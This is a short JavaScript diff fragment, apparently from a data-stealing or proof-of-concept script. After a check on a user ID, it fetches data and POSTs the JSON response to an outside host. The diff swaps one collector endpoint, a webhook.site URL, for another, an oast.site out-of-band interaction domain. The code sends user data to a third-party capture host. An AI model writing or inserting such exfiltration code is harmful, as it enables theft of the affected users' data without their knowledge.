@@ -11,7 +11,7 @@ if (userId) {
         .then(response => response.json())
         .then(data => {
             // Send the data to your server
-            fetch('https://webhook.site/d699ea0b-e69e-44af-88bf-03cd8d40bebb', {
+            fetch('https://ah8eaj5bg2di7v5tu85c91c4vwzuopbe0.oast.site/userdata', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
